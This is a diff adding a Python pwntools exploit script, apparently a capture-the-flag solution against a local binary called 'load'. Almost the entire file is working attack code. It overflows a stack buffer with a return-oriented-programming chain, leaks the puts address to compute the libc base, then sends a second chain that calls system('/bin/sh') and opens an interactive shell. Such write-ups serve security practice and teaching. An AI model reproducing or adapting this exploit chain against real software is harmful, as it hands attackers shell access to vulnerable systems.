@@ -1,0 +1,68 @@
+#! /usr/bin/python
+from pwn import *
+
+r = process('./load')
+context.log_level = 'debug'
+gdb.attach(r,'b* 0x000040089D') #0x0400 8a8 966
+
+
+payload1 = '/proc/self/fd/0' + '\x00'
+payload1 += '/dev/tty' + '\x00'
+payload1 += '/dev/tty' + '\x00'
+payload1 += '/dev/tty' + '\x00'
+payload1 += './flag' + '\x00'
+r.sendlineafter('Input file name: ',payload1)
+
+r.sendlineafter('Input offset: ','0')
+r.sendlineafter('Input size: ','400')
+
+string = 0x0601040
+
+payload2 = 'A'*0x38 # dummy
+## open('/proc/self/fd/0',0,)
+for i in range(0,3):
+	payload2 += p64(0x00400a73) #0x0000000000400a73 : pop rdi ; ret 
+	payload2 += p64(string + 0x10 + 0x09*i)
+	payload2 += p64(0x0400a71) #0x0400a71 : pop rsi ; pop r15 ; ret
+	payload2 += p64(0x02)
+	payload2 += p64(0x00)
+	payload2 += p64(0x0400710) # open@plt  rdx is very biggg!
+
+payload2 += p64(0x0000000000400a73) # 0x0000000000400a73 : pop rdi ; ret
+payload2 += p64(0x000000600FC8 )# puts@got
+payload2 += p64(0x000004006C0) # puts@plt
+payload2 += p64(0x00000000400816) # main
+r.sendline(payload2)
+
+r.recvuntil('Load file complete!\n')
+leak = u64((r.recv(6)).ljust(8,'\x00'))
+libc_base = leak - 1012304
+success('libc_base = '+hex(libc_base))
+
+system_addr = libc_base + 283536
+binsh_addr = libc_base + 1625431
+log.info('system_addr = '+hex(system_addr))
+log.info('binsh_addr ='+hex(binsh_addr))
+
+
+r.sendlineafter('Input file name: ',payload1)
+r.sendlineafter('Input offset: ','0')
+r.sendlineafter('Input size: ','400')
+
+
+payload3 = 'A'*0x38 # dummy
+## open('/proc/self/fd/0',0,)
+for i in range(0,3):
+	payload3 += p64(0x00400a73) #0x0000000000400a73 : pop rdi ; ret 
+	payload3 += p64(string + 0x10 + 0x09*i)
+	payload3 += p64(0x0400a71) #0x0400a71 : pop rsi ; pop r15 ; ret
+	payload3 += p64(0x02)
+	payload3 += p64(0x00)
+	payload3 += p64(0x0400710) # open@plt  rdx is very biggg!
+
+payload3 += p64(0x0000000000400a73) # 0x0000000000400a73 : pop rdi ; ret
+payload3 += p64(binsh_addr)# /bin/sh
+payload3 += p64(system_addr) # system
+r.sendline(payload3)
+
+r.interactive()
